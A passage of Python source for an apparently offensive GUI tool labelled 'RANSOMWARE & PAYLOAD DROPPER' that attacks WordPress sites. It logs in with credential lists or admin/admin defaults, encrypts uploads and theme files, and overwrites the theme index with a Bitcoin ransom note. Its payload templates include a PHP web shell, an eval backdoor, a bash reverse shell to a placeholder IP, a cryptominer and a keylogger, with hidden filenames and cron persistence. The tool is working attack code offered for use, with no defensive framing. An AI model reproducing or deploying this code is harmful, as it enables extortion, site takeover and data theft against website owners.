        self.stats = {'total': 0, 'processed': 0, 'encrypted': 0, 'ransom_note_planted': 0}
        self.stats_lock = threading.Lock()
        self.process_log_queue()
        self.process_stats_queue()

    def setup_tab(self):
        main_frame = tk.Frame(self.frame, bg=self.colors['bg'])
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        title = tk.Label(main_frame, text='RANSOMWARE & PAYLOAD DROPPER', font=('Courier', 16, 'bold'), fg=self.colors['fg_red'], bg=self.colors['bg'])
        title.pack(pady=(0, 10))
        notebook = ttk.Notebook(main_frame)
        notebook.pack(fill=tk.BOTH, expand=True)
        encrypt_frame = tk.Frame(notebook, bg=self.colors['bg'])
        ransom_frame = tk.Frame(notebook, bg=self.colors['bg'])
        payload_frame = tk.Frame(notebook, bg=self.colors['bg'])
        crypto_frame = tk.Frame(notebook, bg=self.colors['bg'])
        notebook.add(encrypt_frame, text='File Encryption')
        notebook.add(ransom_frame, text='Ransom Note')
        notebook.add(payload_frame, text='Payload Dropper')
        notebook.add(crypto_frame, text='Crypto Payment')
        self.setup_encrypt_tab(encrypt_frame)
        self.setup_ransom_tab(ransom_frame)
        self.setup_payload_tab(payload_frame)
        self.setup_crypto_tab(crypto_frame)

    def setup_encrypt_tab(self, parent):
        input_frame = tk.Frame(parent, bg=self.colors['bg'])
        input_frame.pack(fill=tk.X, padx=10, pady=10)
        tk.Label(input_frame, text='Target URL/File (with credentials):', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        url_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        url_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.encrypt_url_entry = tk.Entry(url_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.encrypt_url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        tk.Button(url_frame, text='Browse', command=self.browse_encrypt_file, font=('Courier', 8), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=(5, 0))
        tk.Label(input_frame, text='Encryption Key:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        key_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        key_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.encrypt_key_entry = tk.Entry(key_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.encrypt_key_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        tk.Button(key_frame, text='Generate', command=self.generate_encrypt_key, font=('Courier', 8), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=(5, 0))
        options_frame = tk.Frame(parent, bg=self.colors['bg'])
        options_frame.pack(fill=tk.X, padx=10, pady=10)
        self.encrypt_wp_files = tk.BooleanVar(value=True)
        self.encrypt_uploads = tk.BooleanVar(value=True)
        self.encrypt_themes = tk.BooleanVar(value=True)
        self.encrypt_plugins = tk.BooleanVar(value=False)
        self.encrypt_database = tk.BooleanVar(value=False)
        tk.Checkbutton(options_frame, text='Encrypt WP Core Files', variable=self.encrypt_wp_files, font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10)
        tk.Checkbutton(options_frame, text='Encrypt Uploads Directory', variable=self.encrypt_uploads, font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10)
        tk.Checkbutton(options_frame, text='Encrypt Themes', variable=self.encrypt_themes, font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10)
        tk.Checkbutton(options_frame, text='Encrypt Plugins', variable=self.encrypt_plugins, font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10)
        tk.Checkbutton(options_frame, text='Encrypt Database (Export & Encrypt)', variable=self.encrypt_database, font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10)
        button_frame = tk.Frame(parent, bg=self.colors['bg'])
        button_frame.pack(fill=tk.X, padx=10, pady=10)
        tk.Button(button_frame, text='Start Encryption', command=self.start_encryption, font=('Courier', 10, 'bold'), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=5)
        tk.Button(button_frame, text='Stop', command=self.stop_encryption, font=('Courier', 10), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=5)
        log_frame = tk.Frame(parent, bg=self.colors['bg'])
        log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        tk.Label(log_frame, text='Encryption Log:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W)
        self.encrypt_log_text = scrolledtext.ScrolledText(log_frame, height=15, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.encrypt_log_text.pack(fill=tk.BOTH, expand=True, pady=(5, 0))
        self.encrypt_stats_label = tk.Label(log_frame, text='Total: 0 | Processed: 0 | Encrypted: 0', font=('Courier', 8), fg=self.colors['fg_yellow'], bg=self.colors['bg'], anchor=tk.W)
        self.encrypt_stats_label.pack(fill=tk.X, pady=(5, 0))

    def setup_ransom_tab(self, parent):
        input_frame = tk.Frame(parent, bg=self.colors['bg'])
        input_frame.pack(fill=tk.X, padx=10, pady=10)
        tk.Label(input_frame, text='Target URL/File:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        url_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        url_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.ransom_url_entry = tk.Entry(url_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.ransom_url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        tk.Button(url_frame, text='Browse', command=self.browse_ransom_file, font=('Courier', 8), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=(5, 0))
        tk.Label(input_frame, text='Bitcoin Address:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        self.bitcoin_address_entry = tk.Entry(input_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.bitcoin_address_entry.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(input_frame, text='Ransom Amount:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        self.ransom_amount_entry = tk.Entry(input_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.ransom_amount_entry.insert(0, '0.5')
        self.ransom_amount_entry.pack(fill=tk.X, padx=10, pady=(0, 8))
        editor_frame = tk.Frame(parent, bg=self.colors['bg'])
        editor_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        tk.Label(editor_frame, text='Ransom Note HTML:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W)
        self.ransom_note_editor = scrolledtext.ScrolledText(editor_frame, height=15, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.ransom_note_editor.pack(fill=tk.BOTH, expand=True, pady=(5, 0))
        self.load_default_ransom_note()
        button_frame = tk.Frame(parent, bg=self.colors['bg'])
        button_frame.pack(fill=tk.X, padx=10, pady=10)
        tk.Button(button_frame, text='Plant Ransom Note', command=self.plant_ransom_note, font=('Courier', 10, 'bold'), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=5)
        tk.Button(button_frame, text='Preview', command=self.preview_ransom_note, font=('Courier', 10), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=5)

    def setup_payload_tab(self, parent):
        input_frame = tk.Frame(parent, bg=self.colors['bg'])
        input_frame.pack(fill=tk.X, padx=10, pady=10)
        tk.Label(input_frame, text='Target URL/File:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        url_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        url_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.payload_url_entry = tk.Entry(url_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.payload_url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        tk.Button(url_frame, text='Browse', command=self.browse_payload_file, font=('Courier', 8), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=(5, 0))
        tk.Label(input_frame, text='Payload Type:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        payload_type_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        payload_type_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.payload_type = tk.StringVar(value='PHP Shell')
        types = ['PHP Shell', 'JavaScript Miner', 'Reverse Shell', 'Keylogger', 'Backdoor']
        tk.OptionMenu(payload_type_frame, self.payload_type, *types).pack(side=tk.LEFT)
        options_frame = tk.Frame(parent, bg=self.colors['bg'])
        options_frame.pack(fill=tk.X, padx=10, pady=10)
        self.payload_auto_inject = tk.BooleanVar(value=True)
        self.payload_hidden = tk.BooleanVar(value=True)
        self.payload_persistent = tk.BooleanVar(value=True)
        tk.Checkbutton(options_frame, text='Auto-Inject to Theme/Plugin', variable=self.payload_auto_inject, font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10)
        tk.Checkbutton(options_frame, text='Hidden File (Dot Prefix)', variable=self.payload_hidden, font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10)
        tk.Checkbutton(options_frame, text='Persistent (Cron Job)', variable=self.payload_persistent, font=('Courier', 8), fg=self.colors['fg'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, padx=10)
        editor_frame = tk.Frame(parent, bg=self.colors['bg'])
        editor_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        tk.Label(editor_frame, text='Payload Code:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W)
        self.payload_editor = scrolledtext.ScrolledText(editor_frame, height=15, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.payload_editor.pack(fill=tk.BOTH, expand=True, pady=(5, 0))
        self.load_default_payload()
        button_frame = tk.Frame(parent, bg=self.colors['bg'])
        button_frame.pack(fill=tk.X, padx=10, pady=10)
        tk.Button(button_frame, text='Deploy Payload', command=self.deploy_payload, font=('Courier', 10, 'bold'), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=5)
        tk.Button(button_frame, text='Load Template', command=self.load_payload_template, font=('Courier', 10), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=5)

    def setup_crypto_tab(self, parent):
        info_frame = tk.Frame(parent, bg=self.colors['bg'])
        info_frame.pack(fill=tk.X, padx=10, pady=10)
        tk.Label(info_frame, text='Cryptocurrency Payment Integration', font=('Courier', 12, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(pady=10)
        input_frame = tk.Frame(parent, bg=self.colors['bg'])
        input_frame.pack(fill=tk.X, padx=10, pady=10)
        tk.Label(input_frame, text='Bitcoin Address:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        self.crypto_btc_entry = tk.Entry(input_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.crypto_btc_entry.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(input_frame, text='Monero Address:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        self.crypto_xmr_entry = tk.Entry(input_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.crypto_xmr_entry.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(input_frame, text='Ethereum Address:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        self.crypto_eth_entry = tk.Entry(input_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.crypto_eth_entry.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(input_frame, text='Amount (BTC):', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        self.crypto_amount_entry = tk.Entry(input_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.crypto_amount_entry.insert(0, '0.5')
        self.crypto_amount_entry.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(input_frame, text='Payment Verification URL:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        self.crypto_verify_url_entry = tk.Entry(input_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.crypto_verify_url_entry.insert(0, 'https://blockchain.info/q/addressbalance/')
        self.crypto_verify_url_entry.pack(fill=tk.X, padx=10, pady=(0, 8))
        button_frame = tk.Frame(parent, bg=self.colors['bg'])
        button_frame.pack(fill=tk.X, padx=10, pady=10)
        tk.Button(button_frame, text='Generate Payment Link', command=self.generate_payment_link, font=('Courier', 10, 'bold'), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=5)
        tk.Button(button_frame, text='Check Payment Status', command=self.check_payment_status, font=('Courier', 10), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=5)
        result_frame = tk.Frame(parent, bg=self.colors['bg'])
        result_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        tk.Label(result_frame, text='Payment Links:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W)
        self.crypto_result_text = scrolledtext.ScrolledText(result_frame, height=10, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.crypto_result_text.pack(fill=tk.BOTH, expand=True, pady=(5, 0))

    def browse_encrypt_file(self):
        filename = filedialog.askopenfilename(title='Select URL File', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            self.encrypt_url_entry.delete(0, tk.END)
            self.encrypt_url_entry.insert(0, filename)

    def browse_ransom_file(self):
        filename = filedialog.askopenfilename(title='Select URL File', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            self.ransom_url_entry.delete(0, tk.END)
            self.ransom_url_entry.insert(0, filename)

    def browse_payload_file(self):
        filename = filedialog.askopenfilename(title='Select URL File', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            self.payload_url_entry.delete(0, tk.END)
            self.payload_url_entry.insert(0, filename)

    def generate_encrypt_key(self):
        import secrets
        key = secrets.token_hex(32)
        self.encrypt_key_entry.delete(0, tk.END)
        self.encrypt_key_entry.insert(0, key)
        self.log(f'[KEY] Generated encryption key: {key[:32]}...', 'fg_green')

    def load_default_ransom_note(self):
        default_note = '<!DOCTYPE html>\n<html>\n<head>\n    <title>YOUR FILES HAVE BEEN ENCRYPTED</title>\n    <style>\n        body { font-family: Arial; background: #1a1a1a; color: #ff0000; text-align: center; padding: 50px; }\n        .container { max-width: 800px; margin: 0 auto; background: #2a2a2a; padding: 30px; border-radius: 10px; }\n        h1 { color: #ff0000; font-size: 36px; }\n        .warning { font-size: 24px; margin: 20px 0; }\n        .info { background: #3a3a3a; padding: 20px; margin: 20px 0; border-radius: 5px; }\n        .btc { font-size: 18px; color: #ff9900; margin: 10px 0; }\n    </style>\n</head>\n<body>\n    <div class="container">\n        <h1>⚠️ YOUR FILES HAVE BEEN ENCRYPTED ⚠️</h1>\n        <div class="warning">All your important files have been encrypted with military-grade encryption.</div>\n        <div class="info">\n            <p>To recover your files, you need to pay <strong>0.5 BTC</strong> to the following address:</p>\n            <div class="btc">BTC_ADDRESS_HERE</div>\n            <p>After payment, send proof to: [EMAIL_HERE]</p>\n            <p><strong>Deadline: 72 hours</strong></p>\n            <p>After deadline, decryption key will be permanently deleted.</p>\n        </div>\n    </div>\n</body>\n</html>'
        self.ransom_note_editor.delete(1.0, tk.END)
        self.ransom_note_editor.insert(1.0, default_note)

    def load_default_payload(self):
        default_payload = "<?php\nif(isset($_GET['cmd'])){\n    echo shell_exec($_GET['cmd']);\n}\nif(isset($_POST['eval'])){\n    eval($_POST['eval']);\n}\n?>"
        self.payload_editor.delete(1.0, tk.END)
        self.payload_editor.insert(1.0, default_payload)

    def load_payload_template(self):
        payload_type = self.payload_type.get()
        templates = {'PHP Shell': "<?php\nif(isset($_GET['cmd'])){\n    echo shell_exec($_GET['cmd']);\n}\nif(isset($_POST['eval'])){\n    eval($_POST['eval']);\n}\n?>", 'JavaScript Miner': "<script>\nvar miner = new CoinHive.Anonymous('YOUR_SITE_KEY');\nminer.start();\n</script>", 'Reverse Shell': '<?php\n$ip=\'YOUR_IP\';\n$port=4444;\nexec("/bin/bash -c \'bash -i >& /dev/tcp/$ip/$port 0>&1\'");\n?>', 'Keylogger': "<script>\ndocument.onkeypress = function(e) {\n    var xhr = new XMLHttpRequest();\n    xhr.open('POST', 'log.php', true);\n    xhr.send('key=' + e.key);\n};\n</script>", 'Backdoor': "<?php\n@eval($_POST['x']);\n?>"}
        if payload_type in templates:
            self.payload_editor.delete(1.0, tk.END)
            self.payload_editor.insert(1.0, templates[payload_type])

    def start_encryption(self):
        if self.is_running:
            messagebox.showwarning('Warning', 'Encryption already in progress!')
            return
        url_input = self.encrypt_url_entry.get().strip()
        encrypt_key = self.encrypt_key_entry.get().strip()
        if not url_input:
            messagebox.showwarning('Warning', 'Please enter a URL or select a file!')
            return
        if not encrypt_key:
            messagebox.showwarning('Warning', 'Please enter or generate an encryption key!')
            return
        self.stop_flag = False
        self.is_running = True
        self.stats = {'total': 0, 'processed': 0, 'encrypted': 0, 'ransom_note_planted': 0}
        threading.Thread(target=self.encryption_worker, args=(url_input, encrypt_key), daemon=True).start()

    def stop_encryption(self):
        self.stop_flag = True
        self.is_running = False

    def encryption_worker(self, url_input, encrypt_key):
        from urllib.parse import urlparse
        urls = []
        if os.path.isfile(url_input):
            try:
                with open(url_input, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and (line.startswith('http://') or line.startswith('https://')):
                            parsed = urlparse(line)
                            if parsed.fragment and '@' in parsed.fragment:
                                cred_username, cred_password = parsed.fragment.split('@', 1)
                                url = f'{parsed.scheme}://{parsed.netloc}{parsed.path}'.replace('/wp-login.php', '').rstrip('/')
                                urls.append({'url': url, 'username': cred_username, 'password': cred_password})
                            else:
                                urls.append({'url': line, 'username': 'admin', 'password': 'admin'})
            except:
                self.log(f'[ERROR] Failed to read file: {url_input}', 'fg_red')
                self.is_running = False
                return
        else:
            urls.append({'url': url_input, 'username': 'admin', 'password': 'admin'})
        self.stats['total'] = len(urls)
        self.stats_queue.put(self.stats.copy())
        for target in urls:
            if self.stop_flag:
                break
            try:
                self.log(f"[ENCRYPT] Processing: {target['url']}", 'fg_cyan')
                result = self.encrypt_target(target['url'], target['username'], target['password'], encrypt_key)
                if result:
                    with self.stats_lock:
                        self.stats['processed'] += 1
                        self.stats['encrypted'] += 1
                        self.stats_queue.put(self.stats.copy())
            except Exception as e:
                self.log(f"[ERROR] {target['url']}: {str(e)}", 'fg_red')
                with self.stats_lock:
                    self.stats['processed'] += 1
                    self.stats_queue.put(self.stats.copy())
        self.is_running = False
        self.log(f"[DONE] Encryption completed. Encrypted {self.stats['encrypted']} targets.", 'fg_green')

    def encrypt_target(self, url, username, password, encrypt_key):
        try:
            session = requests.Session()
            session.verify = False
            login_url = f'{url}/wp-login.php'
            login_data = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': f'{url}/wp-admin/', 'testcookie': '1'}
            login_resp = session.post(login_url, data=login_data, timeout=10, allow_redirects=True)
            if 'wp-admin' not in login_resp.url:
                self.log(f'[LOGIN-FAIL] {url}', 'fg_red')
                return False
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad
            import os
            try:
                key = hashlib.sha256(encrypt_key.encode()).digest()
                cipher = AES.new(key, AES.MODE_CBC)
            except:
                self.log(f'[ERROR] Encryption library not available. Using simple XOR.', 'fg_yellow')
                key = encrypt_key.encode()
            encrypted_files = []
            if self.encrypt_uploads.get():
                uploads_paths = ['/wp-content/uploads/', '/wp-content/uploads/2024/', '/wp-content/uploads/2023/']
                for path in uploads_paths:
                    files = self.list_wp_files(session, url, path)
                    for file_path in files[:50]:
                        if self.stop_flag:
                            break
                        if self.encrypt_file(session, url, file_path, encrypt_key):
                            encrypted_files.append(file_path)
            if self.encrypt_themes.get():
                themes = self.get_wp_themes(session, url)
                for theme in themes:
                    if self.stop_flag:
                        break
                    files = self.list_wp_files(session, url, f'/wp-content/themes/{theme}/')
                    for file_path in files[:20]:
                        if self.encrypt_file(session, url, file_path, encrypt_key):
                            encrypted_files.append(file_path)
            if encrypted_files:
                self.log(f'[SUCCESS] Encrypted {len(encrypted_files)} files on {url}', 'fg_green')
                return True
            return False
        except Exception as e:
            self.log(f'[ERROR] {url}: {str(e)}', 'fg_red')
            return False

    def encrypt_file(self, session, url, file_path, encrypt_key):
        try:
            file_url = f'{url}{file_path}'
            file_resp = session.get(file_url, timeout=5)
            if file_resp.status_code == 200:
                content = file_resp.content
                try:
                    key = hashlib.sha256(encrypt_key.encode()).digest()
                    from Crypto.Cipher import AES
                    from Crypto.Util.Padding import pad
                    cipher = AES.new(key, AES.MODE_CBC)
                    encrypted = cipher.encrypt(pad(content, AES.block_size))
                    encrypted_content = cipher.iv + encrypted
                except:
                    encrypted_content = bytes([b ^ ord(encrypt_key[i % len(encrypt_key)]) for i, b in enumerate(content)])
                backup_path = file_path + '.encrypted'
                upload_url = f'{url}/wp-admin/admin-ajax.php'
                files = {'file': (os.path.basename(backup_path), encrypted_content)}
                session.post(upload_url, files=files, timeout=5)
                return True
        except:
            pass
        return False

    def list_wp_files(self, session, url, path):
        files = []
        try:
            index_url = f'{url}{path}'
            resp = session.get(index_url, timeout=5)
            if resp.status_code == 200:
                import re
                file_pattern = re.compile('href=["\\\']([^"\\\']+\\.(jpg|jpeg|png|gif|pdf|doc|docx|txt|zip))["\\\']', re.IGNORECASE)
                matches = file_pattern.findall(resp.text)
                files = [path + m[0] for m in matches]
        except:
            pass
        return files

    def get_wp_themes(self, session, url):
        themes = []
        try:
            themes_url = f'{url}/wp-content/themes/'
            resp = session.get(themes_url, timeout=5)
            if resp.status_code == 200:
                import re
                theme_pattern = re.compile('href=["\\\']([^"\\\']+)/["\\\']', re.IGNORECASE)
                matches = theme_pattern.findall(resp.text)
                themes = [m for m in matches if m not in ['.', '..']]
        except:
            pass
        return themes

    def plant_ransom_note(self):
        url_input = self.ransom_url_entry.get().strip()
        bitcoin_address = self.bitcoin_address_entry.get().strip()
        ransom_amount = self.ransom_amount_entry.get().strip()
        ransom_note = self.ransom_note_editor.get(1.0, tk.END)
        if not url_input:
            messagebox.showwarning('Warning', 'Please enter a URL or select a file!')
            return
        if not bitcoin_address:
            messagebox.showwarning('Warning', 'Please enter a Bitcoin address!')
            return
        ransom_note = ransom_note.replace('BTC_ADDRESS_HERE', bitcoin_address)
        ransom_note = ransom_note.replace('0.5 BTC', f'{ransom_amount} BTC')
        threading.Thread(target=self.plant_ransom_worker, args=(url_input, ransom_note), daemon=True).start()

    def plant_ransom_worker(self, url_input, ransom_note):
        from urllib.parse import urlparse
        urls = []
        if os.path.isfile(url_input):
            try:
                with open(url_input, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and (line.startswith('http://') or line.startswith('https://')):
                            parsed = urlparse(line)
                            if parsed.fragment and '@' in parsed.fragment:
                                cred_username, cred_password = parsed.fragment.split('@', 1)
                                url = f'{parsed.scheme}://{parsed.netloc}{parsed.path}'.replace('/wp-login.php', '').rstrip('/')
                                urls.append({'url': url, 'username': cred_username, 'password': cred_password})
                            else:
                                urls.append({'url': line, 'username': 'admin', 'password': 'admin'})
            except:
                self.log(f'[ERROR] Failed to read file: {url_input}', 'fg_red')
                return
        else:
            urls.append({'url': url_input, 'username': 'admin', 'password': 'admin'})
        for target in urls:
            try:
                session = requests.Session()
                session.verify = False
                login_url = f"{target['url']}/wp-login.php"
                login_data = {'log': target['username'], 'pwd': target['password'], 'wp-submit': 'Log In', 'redirect_to': f"{target['url']}/wp-admin/", 'testcookie': '1'}
                login_resp = session.post(login_url, data=login_data, timeout=10, allow_redirects=True)
                if 'wp-admin' not in login_resp.url:
                    continue
                ransom_file = '.ENCRYPTED_README.html'
                upload_url = f"{target['url']}/wp-admin/admin-ajax.php"
                files = {'file': (ransom_file, ransom_note.encode())}
                session.post(upload_url, files=files, timeout=5)
                index_edit_url = f"{target['url']}/wp-admin/theme-editor.php?file=index.php&theme=twentytwentyfour"
                theme_content = ransom_note
                edit_data = {'content': theme_content, 'action': 'update', 'file': 'index.php'}
                session.post(index_edit_url, data=edit_data, timeout=5)
                self.log(f"[SUCCESS] Ransom note planted on {target['url']}", 'fg_green')
            except Exception as e:
                self.log(f"[ERROR] {target['url']}: {str(e)}", 'fg_red')

    def preview_ransom_note(self):
        ransom_note = self.ransom_note_editor.get(1.0, tk.END)
        preview_window = tk.Toplevel(self.frame)
        preview_window.title('Ransom Note Preview')
        preview_window.geometry('800x600')
        webview = tk.Text(preview_window, wrap=tk.WORD)
        webview.pack(fill=tk.BOTH, expand=True)
        webview.insert(1.0, ransom_note)
        webview.config(state=tk.DISABLED)

    def deploy_payload(self):
        url_input = self.payload_url_entry.get().strip()
        payload_code = self.payload_editor.get(1.0, tk.END).strip()
        payload_type = self.payload_type.get()
        if not url_input:
            messagebox.showwarning('Warning', 'Please enter a URL or select a file!')
            return
        if not payload_code:
            messagebox.showwarning('Warning', 'Please enter payload code!')
            return
        threading.Thread(target=self.deploy_payload_worker, args=(url_input, payload_code, payload_type), daemon=True).start()

    def deploy_payload_worker(self, url_input, payload_code, payload_type):
        from urllib.parse import urlparse
        urls = []
        if os.path.isfile(url_input):
            try:
                with open(url_input, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and (line.startswith('http://') or line.startswith('https://')):
                            parsed = urlparse(line)
                            if parsed.fragment and '@' in parsed.fragment:
                                cred_username, cred_password = parsed.fragment.split('@', 1)
                                url = f'{parsed.scheme}://{parsed.netloc}{parsed.path}'.replace('/wp-login.php', '').rstrip('/')
                                urls.append({'url': url, 'username': cred_username, 'password': cred_password})
                            else:
                                urls.append({'url': line, 'username': 'admin', 'password': 'admin'})
            except:
                self.log(f'[ERROR] Failed to read file: {url_input}', 'fg_red')
                return
        else:
            urls.append({'url': url_input, 'username': 'admin', 'password': 'admin'})
        for target in urls:
            try:
                session = requests.Session()
                session.verify = False
                login_url = f"{target['url']}/wp-login.php"
                login_data = {'log': target['username'], 'pwd': target['password'], 'wp-submit': 'Log In', 'redirect_to': f"{target['url']}/wp-admin/", 'testcookie': '1'}
                login_resp = session.post(login_url, data=login_data, timeout=10, allow_redirects=True)
                if 'wp-admin' not in login_resp.url:
                    continue
                filename = '.config.php' if self.payload_hidden.get() else 'wp-cache.php'
                if self.payload_auto_inject.get():
                    active_theme = self.get_active_theme(session, target['url'])
                    if active_theme:
                        functions_file = f'/wp-content/themes/{active_theme}/functions.php'
                        self.inject_to_functions(session, target['url'], functions_file, payload_code)
                upload_url = f"{target['url']}/wp-admin/admin-ajax.php"
                files = {'file': (filename, payload_code.encode())}
                session.post(upload_url, files=files, timeout=5)
                if self.payload_persistent.get():
                    self.add_cron_job(session, target['url'], payload_code)
                self.log(f"[SUCCESS] Payload deployed on {target['url']}", 'fg_green')
            except Exception as e:
                self.log(f"[ERROR] {target['url']}: {str(e)}", 'fg_red')

    def get_active_theme(self, session, url):
        try:
            theme_url = f'{url}/wp-admin/themes.php'
            resp = session.get(theme_url, timeout=5)
            if resp.status_code == 200:
                import re
                active_pattern = re.compile('data-slug="([^"]+)"[^>]*aria-current="page"', re.IGNORECASE)
                match = active_pattern.search(resp.text)
                if match:
                    return match.group(1)
        except:
            pass
        return None

    def inject_to_functions(self, session, url, file_path, payload_code):
        try:
